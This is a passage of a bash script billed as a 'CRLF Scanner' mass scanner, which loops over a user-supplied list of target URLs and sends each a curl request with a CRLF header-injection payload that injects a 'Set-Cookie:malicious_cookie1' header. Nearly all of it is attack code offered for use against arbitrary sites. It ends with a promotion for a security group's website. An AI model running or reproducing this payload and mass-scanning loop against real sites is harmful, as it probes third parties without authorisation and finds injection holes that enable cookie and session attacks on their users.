yellow='\e[1;33m'
BlueF='\e[1;34m'
clear
BANNERS () {
printf "${white}
======================================================
                   CRLF Scanner

      ${lightgreen}Mass Scanner - Adelittle
${white}=======================================================

"
}
BANNERS
OPTIONS () {
printf "${lightgreen}[>]${white} LIST TARGET                    : "
read list
kurumi=$(cat $list)
}
OPTIONS
SCAN () {
printf "${lightgreen}############## START SCANNING ##############${white}\n"
for kurumi in $(cat $list);
do
curl -I "${kurumi}/__session_start__/%0aSet-Cookie:malicious_cookie1/";
done
}
SCAN
RETURNS () {
printf "${lightgreen}############## FINISH SCANNING ##############${white}\n"
printf "${white}WANT TRY OTHER LIST ? (${lightgreen}Y${white}/${red}N${white}) : "
read return_list
if [[ $return_list == "Y" ]]; then
clear
BANNERS
OPTIONS
SCAN
RETURNS
else
printf "THANKS FOR USING THIS TOOLS ! SEE YOU !\n"
printf "DON'T FORGET TO VISIT HTTP://NAKANOSEC.COM\n"
exit
fi
}
RETURNS
